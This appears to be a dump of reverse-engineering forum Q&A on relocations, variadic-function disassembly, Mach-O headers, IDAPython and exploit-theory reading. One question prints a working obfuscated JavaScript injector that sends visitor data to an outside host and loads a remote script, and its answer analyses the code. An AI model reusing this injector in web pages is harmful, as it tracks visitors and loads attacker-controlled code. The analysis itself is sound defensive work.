  <p>He said: ""If your program makes a frequent access to global variables and constants, it will have a huge relocation table because theres so much places that the loader has to update""
  How does the loader use relocation table and update it?</p>
</blockquote>

<p>Since you use .reloc in your title question, I will explain you relocation information in .reloc section. This section holds information for base relocations which mean if required files cannot be loaded their preferred addresses (because already something mapped to it) instructions or variables relocated with that information. </p>

<p>Loader use virtual address, offset and loaded address to <em>resolve</em> and <em>relocate</em> which is another way to say adjusting addresses. </p>
","15977"
"How do I reverse this javascript code? How is it packed?","1048","","<p>I've a couple of questions regarding this javascript code, I found injected in one of my web pages.</p>

<ol>
<li>What is this script doing?</li>
<li>Which tool is used to pack or obfuscate this script?</li>
<li>How can I learn the working of this script?</li>
</ol>

<p>I've used this tool: <a href=""http://dean.edwards.name/unpacker/"" rel=""nofollow noreferrer"">http://dean.edwards.name/unpacker/</a> but it returning error:</p>

<blockquote>
  <p>error unpacking script: Unexpected token {</p>
</blockquote>

<pre><code>(function(){function x(){var b=K(),a;for(a in b){var m=b[a],c;c=m;if(6!==c.length)c=!1;else{var d;d=c.match(/^[a-z0-9]+$/)?!0:!1;if(d){c=c.split("""");for(index=d=0;index&lt;c.length;++index)d+=c[index].charCodeAt(0);c=465!==d?!1:!0}else c=!1}if(c&amp;&amp;(""undefined""===typeof disable_override||!disable_override))return m}return""gie462""}function K(){for(var b,a=/\+/g,m=/([^&amp;=]+)=?([^&amp;]*)/g,c=function(b){b=b.replace(a,"" "");var c;a:{c=b;var d=""%20 %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %7B %7C %7D %7E %60"".split("" "");
    for(i=0;i&lt;d.length;i++)if(-1!==c.indexOf(d[i])){c=!0;break a}c=!1}return c?decodeURIComponent(b):b},d=window.location.search.substring(1),e={};b=m.exec(d);)e[c(b[1])]=c(b[2]);return e}function q(){for(var b=document.getElementsByTagName(""script""),a=0;a&lt;b.length;a++)if(-1!=b[a].src.indexOf(""gie462""))return b[a]}function H(b){return String.fromCharCode.apply(null,arguments)}var l={alphabet:""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="",lookup:null,ie:/MSIE /.test(navigator.userAgent),
    ieo:/MSIE [67]/.test(navigator.userAgent),encode:function(b){b=l.toUtf8(b);var a=-1,m=b.length,c,d,e=[,,,];if(l.ie){for(var r=[];++a&lt;m;)c=b[a],d=b[++a],e[0]=c&gt;&gt;2,e[1]=(c&amp;3)&lt;&lt;4|d&gt;&gt;4,isNaN(d)?e[2]=e[3]=64:(c=b[++a],e[2]=(d&amp;15)&lt;&lt;2|c&gt;&gt;6,e[3]=isNaN(c)?64:c&amp;63),r.push(l.alphabet.charAt(e[0]),l.alphabet.charAt(e[1]),l.alphabet.charAt(e[2]),l.alphabet.charAt(e[3]));return r.join("""")}for(r="""";++a&lt;m;)c=b[a],d=b[++a],e[0]=c&gt;&gt;2,e[1]=(c&amp;3)&lt;&lt;4|d&gt;&gt;4,isNaN(d)?e[2]=e[3]=64:(c=b[++a],e[2]=(d&amp;15)&lt;&lt;2|c&gt;&gt;6,e[3]=isNaN(c)?
        64:c&amp;63),r+=l.alphabet[e[0]]+l.alphabet[e[1]]+l.alphabet[e[2]]+l.alphabet[e[3]];return r},decode:function(b){if(b.length%4)throw Error(""decode failed."");b=l.fromUtf8(b);var a=0,m=b.length;if(l.ieo){for(var c=[];a&lt;m;)128&gt;b[a]?c.push(String.fromCharCode(b[a++])):191&lt;b[a]&amp;&amp;224&gt;b[a]?c.push(String.fromCharCode((b[a++]&amp;31)&lt;&lt;6|b[a++]&amp;63)):c.push(String.fromCharCode((b[a++]&amp;15)&lt;&lt;12|(b[a++]&amp;63)&lt;&lt;6|b[a++]&amp;63));return c.join("""")}for(c="""";a&lt;m;)c=128&gt;b[a]?c+String.fromCharCode(b[a++]):191&lt;b[a]&amp;&amp;224&gt;b[a]?c+String.fromCharCode((b[a++]&amp;
        31)&lt;&lt;6|b[a++]&amp;63):c+String.fromCharCode((b[a++]&amp;15)&lt;&lt;12|(b[a++]&amp;63)&lt;&lt;6|b[a++]&amp;63);return c},toUtf8:function(b){var a=-1,m=b.length,c,d=[];if(/^[\x00-\x7f]*$/.test(b))for(;++a&lt;m;)d.push(b.charCodeAt(a));else for(;++a&lt;m;)c=b.charCodeAt(a),128&gt;c?d.push(c):2048&gt;c?d.push(c&gt;&gt;6|192,c&amp;63|128):d.push(c&gt;&gt;12|224,c&gt;&gt;6&amp;63|128,c&amp;63|128);return d},fromUtf8:function(b){var a=-1,m,c=[],d=[,,,];if(!l.lookup){m=l.alphabet.length;for(l.lookup={};++a&lt;m;)l.lookup[l.alphabet.charAt(a)]=a;a=-1}for(m=b.length;++a&lt;m;){d[0]=
        l.lookup[b.charAt(a)];d[1]=l.lookup[b.charAt(++a)];c.push(d[0]&lt;&lt;2|d[1]&gt;&gt;4);d[2]=l.lookup[b.charAt(++a)];if(64==d[2])break;c.push((d[1]&amp;15)&lt;&lt;4|d[2]&gt;&gt;2);d[3]=l.lookup[b.charAt(++a)];if(64==d[3])break;c.push((d[2]&amp;3)&lt;&lt;6|d[3])}return c}};(function(){function b(a,c){function e(g){if(e[g]!==w)return e[g];var h;if(""bug-string-char-index""==g)h=!1;else if(""json""==g)h=e(""json-stringify"")&amp;&amp;e(""json-parse"");else{var a;if(""json-stringify""==g){h=c.stringify;var b=""function""==typeof h&amp;&amp;t;if(b){(a=function(){return 1}).toJSON=
    a;try{b=""0""===h(0)&amp;&amp;""0""===h(new l)&amp;&amp;'""""'==h(new x)&amp;&amp;h(u)===w&amp;&amp;h(w)===w&amp;&amp;h()===w&amp;&amp;""1""===h(a)&amp;&amp;""[1]""==h([a])&amp;&amp;""[null]""==h([w])&amp;&amp;""null""==h(null)&amp;&amp;""[null,null,null]""==h([w,u,null])&amp;&amp;'{""a"":[1,true,false,null,""\\u0000\\b\\n\\f\\r\\t""]}'==h({a:[a,!0,!1,null,""\x00\b\n\f\r\t""]})&amp;&amp;""1""===h(null,a)&amp;&amp;""[\n 1,\n 2\n]""==h([1,2],null,1)&amp;&amp;'""-271821-04-20T00:00:00.000Z""'==h(new q(-864E13))&amp;&amp;'""+275760-09-13T00:00:00.000Z""'==h(new q(864E13))&amp;&amp;'""-000001-01-01T00:00:00.000Z""'==h(new q(-621987552E5))&amp;&amp;'""1969-12-31T23:59:59.999Z""'==
    h(new q(-1))}catch(d){b=!1}}h=b}if(""json-parse""==g){h=c.parse;if(""function""==typeof h)try{if(0===h(""0"")&amp;&amp;!h(!1)){a=h('{""a"":[1,true,false,null,""\\u0000\\b\\n\\f\\r\\t""]}');var B=5==a.a.length&amp;&amp;1===a.a[0];if(B){try{B=!h('""\t""')}catch(d){}if(B)try{B=1!==h(""01"")}catch(d){}if(B)try{B=1!==h(""1."")}catch(d){}}}}catch(d){B=!1}h=B}}return e[g]=!!h}a||(a=d.Object());c||(c=d.Object());var l=a.Number||d.Number,x=a.String||d.String,r=a.Object||d.Object,q=a.Date||d.Date,E=a.SyntaxError||d.SyntaxError,H=a.TypeError||
    d.TypeError,K=a.Math||d.Math,I=a.JSON||d.JSON;""object""==typeof I&amp;&amp;I&amp;&amp;(c.stringify=I.stringify,c.parse=I.parse);var r=r.prototype,u=r.toString,v,D,w,t=new q(-0xc782b5b800cec);try{t=-109252==t.getUTCFullYear()&amp;&amp;0===t.getUTCMonth()&amp;&amp;1===t.getUTCDate()&amp;&amp;10==t.getUTCHours()&amp;&amp;37==t.getUTCMinutes()&amp;&amp;6==t.getUTCSeconds()&amp;&amp;708==t.getUTCMilliseconds()}catch(g){}if(!e(""json"")){var F=e(""bug-string-char-index"");if(!t)var y=K.floor,Q=[0,31,59,90,120,151,181,212,243,273,304,334],G=function(g,h){return Q[h]+365*
    (g-1970)+y((g-1969+(h=+(1&lt;h)))/4)-y((g-1901+h)/100)+y((g-1601+h)/400)};(v=r.hasOwnProperty)||(v=function(g){var h={},a;(h.__proto__=null,h.__proto__={toString:1},h).toString!=u?v=function(g){var a=this.__proto__;g=g in(this.__proto__=null,this);this.__proto__=a;return g}:(a=h.constructor,v=function(g){var h=(this.constructor||a).prototype;return g in this&amp;&amp;!(g in h&amp;&amp;this[g]===h[g])});h=null;return v.call(this,g)});D=function(g,a){var c=0,b,d,f;(b=function(){this.valueOf=0}).prototype.valueOf=0;d=
    new b;for(f in d)v.call(d,f)&amp;&amp;c++;b=d=null;c?D=2==c?function(g,a){var h={},c=""[object Function]""==u.call(g),b;for(b in g)c&amp;&amp;""prototype""==b||v.call(h,b)||!(h[b]=1)||!v.call(g,b)||a(b)}:function(g,a){var h=""[object Function]""==u.call(g),b,c;for(b in g)h&amp;&amp;""prototype""==b||!v.call(g,b)||(c=""constructor""===b)||a(b);(c||v.call(g,b=""constructor""))&amp;&amp;a(b)}:(d=""valueOf toString toLocaleString propertyIsEnumerable isPrototypeOf hasOwnProperty constructor"".split("" ""),D=function(g,a){var h=""[object Function]""==
    u.call(g),b,c=!h&amp;&amp;""function""!=typeof g.constructor&amp;&amp;m[typeof g.hasOwnProperty]&amp;&amp;g.hasOwnProperty||v;for(b in g)h&amp;&amp;""prototype""==b||!c.call(g,b)||a(b);for(h=d.length;b=d[--h];c.call(g,b)&amp;&amp;a(b));});return D(g,a)};if(!e(""json-stringify"")){var R={92:""\\\\"",34:'\\""',8:""\\b"",12:""\\f"",10:""\\n"",13:""\\r"",9:""\\t""},z=function(g,a){return(""000000""+(a||0)).slice(-g)},N=function(g){for(var a='""',b=0,c=g.length,d=!F||10&lt;c,f=d&amp;&amp;(F?g.split(""""):g);b&lt;c;b++){var k=g.charCodeAt(b);switch(k){case 8:case 9:case 10:case 12:case 13:case 34:case 92:a+=
    R[k];break;default:a=32&gt;k?a+(""\\u00""+z(2,k.toString(16))):a+(d?f[b]:g.charAt(b))}}return a+'""'},L=function(g,a,b,c,d,f,k){var e,p,l,m,n,q,r,t,A;try{e=a[g]}catch(x){}if(""object""==typeof e&amp;&amp;e)if(p=u.call(e),""[object Date]""!=p||v.call(e,""toJSON""))""function""==typeof e.toJSON&amp;&amp;(""[object Number]""!=p&amp;&amp;""[object String]""!=p&amp;&amp;""[object Array]""!=p||v.call(e,""toJSON""))&amp;&amp;(e=e.toJSON(g));else if(e&gt;-1/0&amp;&amp;e&lt;1/0){if(G){m=y(e/864E5);for(p=y(m/365.2425)+1970-1;G(p+1,0)&lt;=m;p++);for(l=y((m-G(p,0))/30.42);G(p,l+1)&lt;=m;l++);
    m=1+m-G(p,l);n=(e%864E5+864E5)%864E5;q=y(n/36E5)%24;r=y(n/6E4)%60;t=y(n/1E3)%60;n%=1E3}else p=e.getUTCFullYear(),l=e.getUTCMonth(),m=e.getUTCDate(),q=e.getUTCHours(),r=e.getUTCMinutes(),t=e.getUTCSeconds(),n=e.getUTCMilliseconds();e=(0&gt;=p||1E4&lt;=p?(0&gt;p?""-"":""+"")+z(6,0&gt;p?-p:p):z(4,p))+""-""+z(2,l+1)+""-""+z(2,m)+""T""+z(2,q)+"":""+z(2,r)+"":""+z(2,t)+"".""+z(3,n)+""Z""}else e=null;b&amp;&amp;(e=b.call(a,g,e));if(null===e)return""null"";p=u.call(e);if(""[object Boolean]""==p)return""""+e;if(""[object Number]""==p)return e&gt;-1/0&amp;&amp;e&lt;
1/0?""""+e:""null"";if(""[object String]""==p)return N(""""+e);if(""object""==typeof e){for(g=k.length;g--;)if(k[g]===e)throw H();k.push(e);A=[];a=f;f+=d;if(""[object Array]""==p){l=0;for(g=e.length;l&lt;g;l++)p=L(l,e,b,c,d,f,k),A.push(p===w?""null"":p);g=A.length?d?""[\n""+f+A.join("",\n""+f)+""\n""+a+""]"":""[""+A.join("","")+""]"":""[]""}else D(c||e,function(g){var a=L(g,e,b,c,d,f,k);a!==w&amp;&amp;A.push(N(g)+"":""+(d?"" "":"""")+a)}),g=A.length?d?""{\n""+f+A.join("",\n""+f)+""\n""+a+""}"":""{""+A.join("","")+""}"":""{}"";k.pop();return g}};c.stringify=function(g,
a,b){var c,e,d,f;if(m[typeof a]&amp;&amp;a)if(""[object Function]""==(f=u.call(a)))e=a;else if(""[object Array]""==f){d={};for(var l=0,p=a.length,n;l&lt;p;n=a[l++],(f=u.call(n),""[object String]""==f||""[object Number]""==f)&amp;&amp;(d[n]=1));}if(b)if(""[object Number]""==(f=u.call(b))){if(0&lt;(b-=b%1))for(c="""",10&lt;b&amp;&amp;(b=10);c.length&lt;b;c+="" "");}else""[object String]""==f&amp;&amp;(c=10&gt;=b.length?b:b.slice(0,10));return L("""",(n={},n[""""]=g,n),e,d,c,"""",[])}}if(!e(""json-parse"")){var S=x.fromCharCode,T={92:""\\"",34:'""',47:""/"",98:""\b"",116:""\t"",
    110:""\n"",102:""\f"",114:""\r""},f,J,n=function(){f=J=null;throw E();},C=function(){for(var a=J,b=a.length,c,e,d,l,k;f&lt;b;)switch(k=a.charCodeAt(f),k){case 9:case 10:case 13:case 32:f++;break;case 123:case 125:case 91:case 93:case 58:case 44:return c=F?a.charAt(f):a[f],f++,c;case 34:c=""@"";for(f++;f&lt;b;)if(k=a.charCodeAt(f),32&gt;k)n();else if(92==k)switch(k=a.charCodeAt(++f),k){case 92:case 34:case 47:case 98:case 116:case 110:case 102:case 114:c+=T[k];f++;break;case 117:e=++f;for(d=f+4;f&lt;d;f++)k=a.charCodeAt(f),
48&lt;=k&amp;&amp;57&gt;=k||97&lt;=k&amp;&amp;102&gt;=k||65&lt;=k&amp;&amp;70&gt;=k||n();c+=S(""0x""+a.slice(e,f));break;default:n()}else{if(34==k)break;k=a.charCodeAt(f);for(e=f;32&lt;=k&amp;&amp;92!=k&amp;&amp;34!=k;)k=a.charCodeAt(++f);c+=a.slice(e,f)}if(34==a.charCodeAt(f))return f++,c;n();default:e=f;45==k&amp;&amp;(l=!0,k=a.charCodeAt(++f));if(48&lt;=k&amp;&amp;57&gt;=k){for(48==k&amp;&amp;(k=a.charCodeAt(f+1),48&lt;=k&amp;&amp;57&gt;=k)&amp;&amp;n();f&lt;b&amp;&amp;(k=a.charCodeAt(f),48&lt;=k&amp;&amp;57&gt;=k);f++);if(46==a.charCodeAt(f)){for(d=++f;d&lt;b&amp;&amp;(k=a.charCodeAt(d),48&lt;=k&amp;&amp;57&gt;=k);d++);d==f&amp;&amp;n();f=d}k=a.charCodeAt(f);if(101==
    k||69==k){k=a.charCodeAt(++f);43!=k&amp;&amp;45!=k||f++;for(d=f;d&lt;b&amp;&amp;(k=a.charCodeAt(d),48&lt;=k&amp;&amp;57&gt;=k);d++);d==f&amp;&amp;n();f=d}return+a.slice(e,f)}l&amp;&amp;n();if(""true""==a.slice(f,f+4))return f+=4,!0;if(""false""==a.slice(f,f+5))return f+=5,!1;if(""null""==a.slice(f,f+4))return f+=4,null;n()}return""$""},M=function(a){var b,c;""$""==a&amp;&amp;n();if(""string""==typeof a){if(""@""==(F?a.charAt(0):a[0]))return a.slice(1);if(""[""==a){for(b=[];;c||(c=!0)){a=C();if(""]""==a)break;c&amp;&amp;("",""==a?(a=C(),""]""==a&amp;&amp;n()):n());"",""==a&amp;&amp;n();b.push(M(a))}return b}if(""{""==
    a){for(b={};;c||(c=!0)){a=C();if(""}""==a)break;c&amp;&amp;("",""==a?(a=C(),""}""==a&amp;&amp;n()):n());"",""!=a&amp;&amp;""string""==typeof a&amp;&amp;""@""==(F?a.charAt(0):a[0])&amp;&amp;"":""==C()||n();b[a.slice(1)]=M(C())}return b}n()}return a},P=function(a,b,c){c=O(a,b,c);c===w?delete a[b]:a[b]=c},O=function(a,b,c){var d=a[b],e;if(""object""==typeof d&amp;&amp;d)if(""[object Array]""==u.call(d))for(e=d.length;e--;)P(d,e,c);else D(d,function(a){P(d,a,c)});return c.call(a,b,d)};c.parse=function(a,b){var c,d;f=0;J=""""+a;c=M(C());""$""!=C()&amp;&amp;n();f=J=null;return b&amp;&amp;
""[object Function]""==u.call(b)?O((d={},d[""""]=c,d),"""",b):c}}}c.runInContext=b;return c}var a=""function""===typeof define&amp;&amp;define.amd,m={""function"":!0,object:!0},c=m[typeof exports]&amp;&amp;exports&amp;&amp;!exports.nodeType&amp;&amp;exports,d=m[typeof window]&amp;&amp;window||this,e=c&amp;&amp;m[typeof module]&amp;&amp;module&amp;&amp;!module.nodeType&amp;&amp;""object""==typeof global&amp;&amp;global;!e||e.global!==e&amp;&amp;e.window!==e&amp;&amp;e.self!==e||(d=e);if(c&amp;&amp;!a)b(d,c);else{var l=d.JSON,x=d.JSON3,q=!1,E=b(d,d.JSON3={noConflict:function(){q||(q=!0,d.JSON=l,d.JSON3=x,l=x=null);
    return E}});d.JSON={parse:E.parse,stringify:E.stringify}}a&amp;&amp;define(function(){return E})}).call(this);(function(){var b=x(),a=(new Date).getTimezoneOffset()/-1,m=Math.floor(9999999*Math.random()+1E4),c=document.referrer,d=window.location.toString(),e;e=(e=/\?cr=([^&amp;]+)/.exec(q().src))?l.decode(e[1]):"""";b=""?d=""+l.encode(JSON.stringify({k:b,b:a,c:m,r:c,s:d,cr:e}));a=q().src;a=-1&lt;a.indexOf(""//"")?a.split(""/"")[2]:a.split(""/"")[0];a=a.split("":"")[0];a=""//""+(a?a:H(106,115,45,99,100,110,46,99,111,109))+H(47,
        105,109,112,47)+x()+"".js"";document.write('&lt;script src=""'+(a+b)+'""&gt;\x3c/script&gt;')})()})();
</code></pre>
","<p><strong>1.</strong></p>

<p>The script writes a <code>&lt;script src=...&gt;</code> tag at the end, so to know what it is doing, you could change the last <code>document.write</code> to a <code>console.log</code> or other defanging measures to see that this is written out:</p>

<pre><code>&lt;script src=""//srvjs.com/imp/gie462.js?d=«base64»""&gt;&lt;/script&gt;
</code></pre>

<p>Visiting that URL <del>gives ""Whoops, looks like something went wrong."" in HTML</del>, so I guess the script has been inactivated at the moment, or I didn't pass the correct parameters. </p>

<p>If the script is loaded with relative path instead of from <code>srvjs.com</code>, the host becomes <code>js-cdn.com</code> instead. Googling for <code>js-cdn.com</code> gives <a href=""https://thecomputerperson.wordpress.com/2015/07/12/yet-another-microsoft-scam-support-company-getsupportforyourpc-com-righttechnicalsupport-com/"" rel=""nofollow noreferrer"">this blog post</a> which indicates the site is related to scam in 2015. </p>

<p>Note that both <code>srvjs.com/imp/gie462.js</code> and <code>js-cdn.com/imp/gie462.js</code> return the same content, so these two websites should be strongly related. </p>

<p><strong>2.</strong></p>

<p>There isn't much obfuscation, I think your unpacker is just not very good in quality. I just used VS Code's beautifier to <a href=""http://pastebin.com/AsV91hrr"" rel=""nofollow noreferrer"">get this</a>.</p>

<p><strong>3.</strong></p>

<p>The script is long, mainly because it included a lot of libraries. </p>

<ul>
<li><p>The <code>var l = {alphabet: ...}</code> part is a base64 encoding library from <a href=""https://stackoverflow.com/a/24133397/224671"">https://stackoverflow.com/a/24133397/224671</a> (o_O)</p></li>
<li><p>The <code>function() { ... }.call(this)</code> next it is <a href=""http://bestiejs.github.io/json3/"" rel=""nofollow noreferrer"">JSON3</a>. </p></li>
<li><p>The base64 data sent can be seen to be:</p>

<pre><code>    {""k"": ""gie462"", 
     ""b"": (timezone),
     ""c"": (random integer),
     ""r"": (referrer),
     ""d"": (current URL),
     ""cr"": (the parameter `cr` of current page)}
</code></pre>

<p>which doesn't seem to leak much information about the user before loading the real script (<code>imp/gie462.js</code>). What is done in the real script is yet to be known.</p></li>
</ul>

<hr>

<p><em>Update 2016 Nov 7th:</em> The script is now up, currently just redirects to <a href=""http://google.com"" rel=""nofollow noreferrer"">http://google.com</a> when not given any parameters, so probably still in testing phase.</p>
","13869"
"Identifying variable args function","1048","","<p>How would a C variable argument function such as <code>printf(char* format, ...)</code> look like when disassembled?</p>

<p>Is it always identified by calling convention, or are there more ways to identify it?</p>
","<p>It is very simple in some architectures, and not very obvious in others. I'll describe a few I'm familiar with.</p>

<h2>SystemV x86_64 (Linux, OS X, BSD)</h2>

<p>Probably the easiest to recognize. Because of the boneheaded decision to specify the number of used XMM registers in <code>al</code>, most vararg functions begin like this:</p>

<pre><code>    push    rbp
    mov     rbp, rsp
    sub     rsp, 0E0h
    mov     [rbp+var_A8], rsi
    mov     [rbp+var_A0], rdx
    mov     [rbp+var_98], rcx
    mov     [rbp+var_90], r8
    mov     [rbp+var_88], r9
    movzx   eax, al
    lea     rdx, ds:0[rax*4]
    lea     rax, loc_402DA1
    sub     rax, rdx
    lea     rdx, [rbp+var_1]
    jmp     rax
    movaps  xmmword ptr [rdx-0Fh], xmm7
    movaps  xmmword ptr [rdx-1Fh], xmm6
    movaps  xmmword ptr [rdx-2Fh], xmm5
    movaps  xmmword ptr [rdx-3Fh], xmm4
    movaps  xmmword ptr [rdx-4Fh], xmm3
    movaps  xmmword ptr [rdx-5Fh], xmm2
    movaps  xmmword ptr [rdx-6Fh], xmm1
    movaps  xmmword ptr [rdx-7Fh], xmm0
loc_402DA1:
</code></pre>

<p>Note how it's using <code>al</code> to determine how many xmm registers to spill onto the stack.</p>

<h2>Windows x64 aka AMD64</h2>

<p>In Win64 it's less obvious, but here's one sign: the registers that correspond to the elliptic parameters are always spilled onto the stack and at positions that line up with the rest of arguments passed on the stack. E.g. here's the <code>printf</code>'s prolog:</p>

<pre><code>  mov     rax, rsp
  mov     [rax+8], rcx
  mov     [rax+10h], rdx
  mov     [rax+18h], r8
  mov     [rax+20h], r9
</code></pre>

<p>Here, <code>rcx</code> contains the fixed <code>format</code> argument, and the elliptic arguments are passed in <code>rdx</code>, <code>r8</code> and <code>r9</code> and then on the stack. We can observe that <code>rdx</code>, <code>r8</code> and <code>r9</code> are stored exactly one after another, and just below the rest of the arguments, which begin at <code>rsp+0x28</code>. The area [rsp+8..rsp+0x28] is reserved <a href=""http://msdn.microsoft.com/en-us/library/ew5tede7.aspx"">exactly for this purpose</a>, but the non-vararg functions often don't store all register arguments there, or reuse that area for local variables. For example, here's a <em>non</em>-vararg function prolog:</p>

<pre><code>  mov     [rsp+10h], rbx
  mov     [rsp+18h], rbp
  mov     [rsp+20h], rsi
</code></pre>

<p>You can see that it's using the reserved area for saving non-volatile registers, and not spilling the register arguments.</p>

<h2>ARM</h2>

<p>ARM calling convention uses <code>R0</code>-<code>R3</code> for the first arguments, so vararg functions need to spill them onto stack to line up with the rest of parameters passed on the stack. Thus you will see <code>R0</code>-<code>R3</code> (or <code>R1</code>-<code>R3</code>, or <code>R2</code>-<code>R3</code> or just <code>R3</code>) being pushed onto stack, which <em>usually</em> does not happen in non-vararg functions. It's not a 100% foolproof indicator - e.g. Microsoft's compiler sometimes pushes <code>R0</code>-<code>R1</code> onto the stack and accesses them using <code>SP</code> instead of moving to other registers and using that. But I think it's a pretty reliable sign for GCC. Here's an example of GCC-compiled function:</p>

<pre><code>STMFD   SP!, {R0-R3}
LDR     R3, =dword_86090
STR     LR, [SP,#0x10+var_14]!
LDR     R1, [SP,#0x14+varg_r0] ; format
LDR     R0, [R3]        ; s
ADD     R2, SP, #0x14+varg_r1 ; arg
BL      vsprintf
LDR     R3, =dword_86094
MOV     R2, #1
STR     R2, [R3]
LDR     LR, [SP+0x14+var_14],#4
ADD     SP, SP, #0x10
RET
</code></pre>

<p>It's obviously a vararg function because it's calling <code>vsprintf</code>, and we can see <code>R0</code>-<code>R3</code> being pushed right at the start (you can't push anything else before that because the potential stack arguments are present at <code>SP</code> and so the <code>R0</code>-<code>R3</code> have to precede them).</p>
","105"
"How are dylib files laid out","1046","","<p>My end goal here is to find the Mach-O header in a dylib file.</p>

<p>Here's what I've come up with so far:</p>

<p>All my dylib files have the following first four bytes: 0xcafebabe. Then after 4096 bytes the actual Mach-O header starts, followed by the usual commands and so on.</p>

<p>But 0xcafebabe is also used to identify Java class files. So how do I distinguish between both of those based on the actual content? What are the fields after 0xcafebabe in a dylib file?</p>
","<p>Since a dylib file is just going to be a Mach-O file, you're going to need to understand the header format, which is laid out pretty well in the code itself. You can take a look at the Mach-O parsing functions on Apple's site</p>

<p><a href=""http://www.opensource.apple.com/source/xar/xar-45/xar/lib/macho.c"" rel=""nofollow"">http://www.opensource.apple.com/source/xar/xar-45/xar/lib/macho.c</a></p>

<p>What you're seeing is that FAT Header part of the Mach-O file, which is telling you where to find the rest of the of the Mach-O file. This is used to have one file, with two separate architectures inside of it. The FAT header describes where the to find the rest of the data needed by the system running it.</p>

<p>While doing some reversing and forensics work, I created a 010Editor template for parsing through Mach-O files - it might be useful in conjunction with the source from Apple for understanding what is coming after the 0xCAFEBABE and loading you're actual dylib files;</p>

<p><a href=""https://github.com/strazzere/010Editor-stuff/blob/master/Templates/MachOTemplate.bt"" rel=""nofollow"">https://github.com/strazzere/010Editor-stuff/blob/master/Templates/MachOTemplate.bt</a></p>
","5902"
"Get a list of global variables with IDA python","1042","","<p>I am trying to use IDA python to get a list of all variables in .data section because I want to extract a list of cross references to each global variables from IDA.
Is it possible to do this with IDA python?</p>
","<p>Although <a href=""http://sark.rtfd.io/"" rel=""nofollow"">Sark</a> is a good library/tool, if you're only looking for a small utility script you might want to avoid the overhead of installing it. I do  recommend you give it a try regardless.</p>

<p>The following code will do just that without using any third party code:</p>

<pre><code># get segment start and end EA by name
idata_seg_selector = idc.SegByName('.data')
idata_seg_startea = idc.SegByBase(idata_seg_selector)
idata_seg_endea = idc.SegEnd(idata_seg_startea)

# iterate EAs in range
for seg_ea in range(idata_seg_startea, idata_seg_endea):
  # iretate xrefs to specific ea
  for xref in idautils.xrefsto(ea):
    print(""Found a cross reference {}: from {} to '.idata' variable {}"".format(xref, xref.frm, seg_ea))
</code></pre>

<p>Gotaches:</p>

<ul>
<li>Using this code you'll see all cross references, not only those with a name, although adding that is quite trivial if you'd rather have it that way.</li>
<li>As mentioned by @ws, you'll only see variables located at the <code>.data</code> section as the OP requested, you should consider including other data related sections (such as <code>.idata</code>, <code>.rodata</code>, <code>.bss</code>, and others). Alternatively you might want to consider using <code>idc.isData(idc.GetFlags(ea))</code> to filter out non-data offsets in some or all sections.</li>
</ul>
","13458"
"How to find memory addresses which are read from but not written to","1040","","<p>Analysing a bootmanager : I'm trying to track all variables which are only read from, and not written to... which will give me the external variables it uses...</p>

<p>Is there any such functionality in IDA pro free? Can I write a plugin for it in the free version? Any other options for this purpose? Any other tool which can do this?</p>
","<p>Since you are only interested in variables that are read from, not written to, I'll assume you're talking about global variables since it makes no sense to have a local variable that's never written to.</p>

<p>You can write an IDC script to iterate through each global variable and use <a href=""https://www.hex-rays.com/products/ida/support/idadoc/313.shtml"" rel=""nofollow""><code>RfirstB</code>, <code>RnextB</code>, and <code>XrefType</code></a> to determine which global variables are read from, written to, or both.</p>
","3643"
"mathematical background behind exploit development and vulnerabilities","1035","","<p>I would like more information about the mathematical foundations of vulnerability and exploit development.online sources or books in the right direction will be helpful.</p>
","<p>I would read up on <a href=""http://en.wikipedia.org/wiki/Static_program_analysis"">static program analysis</a></p>

<blockquote>
  <p>Static program analysis is the analysis of computer software that is performed without actually executing programs (analysis performed on executing programs is known as dynamic analysis). In most cases the analysis is performed on some version of the source code and in the other cases some form of the object code.</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/Dynamic_program_analysis"">dynamic program analysis</a>,</p>

<blockquote>
  <p>Dynamic program analysis is the analysis of computer software that is performed by executing programs on a real or virtual processor. For dynamic program analysis to be effective, the target program must be executed with sufficient test inputs to produce interesting behavior</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/Abstract_interpretation"">abstract interpretation</a>,</p>

<blockquote>
  <p>In computer science, abstract interpretation is a theory of sound approximation of the semantics of computer programs, based on monotonic functions over ordered sets, especially lattices. It can be viewed as a partial execution of a computer program which gains information about its semantics (e.g. control-flow, data-flow) without performing all the calculations.</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/Symbolic_execution"">symbolic execution</a>,</p>

<blockquote>
  <p>In computer science, symbolic execution (also symbolic evaluation) refers to the analysis of programs by tracking symbolic rather than actual values, a case of abstract interpretation. The field of symbolic simulation applies the same concept to hardware. Symbolic computation applies the concept to the analysis of mathematical expressions.
  Symbolic execution is used to reason about all the inputs that take the same path through a program.</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/Symbolic_computation"">symbolic computation</a>,</p>

<blockquote>
  <p>In mathematics and computer science, computer algebra, also called symbolic computation or algebraic computation is a scientific area that refers to the study and development of algorithms and software for manipulating mathematical expressions and other mathematical objects</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/Symbolic_simulation"">symbolic simulation</a>,</p>

<blockquote>
  <p>In computer science, a simulation is a computation of the execution of some appropriately modelled state-transition system. Typically this process models the complete state of the system at individual points in a discrete linear time frame, computing each state sequentially from its predecessor.</p>
</blockquote>

<p><a href=""http://en.wikipedia.org/wiki/Model_checking"">model checking</a>,</p>

<blockquote>
  <p>In computer science, model checking aka property checking refers to the following problem: Given a model of a system, exhaustively and automatically check whether this model meets a given specification.</p>
</blockquote>

<p>might want to read <a href=""http://www.amazon.co.uk/System-Assurance-Beyond-Detecting-Vulnerabilities/dp/0123814146/ref=sr_1_4?ie=UTF8&amp;qid=1365706657"">System Assurance: Beyond Detecting Vulnerabilities</a>.</p>

<p>Rolf probably has a ton of really good input on this subject. Read about his advice <a href=""http://www.reddit.com/r/ReverseEngineering/comments/smf4u/reverser_wanting_to_develop_mathematically/"">here</a></p>
","1729"
"vtrace / vivisect resources","1035","","<p>Where can I find some resources to start learning about vivisect? 
Blog posts, presentations, PDFs, code examples, anything would be appreciated.</p>

<p>I am aware I can read the code but before doing that I would like to have something to get me started.</p>
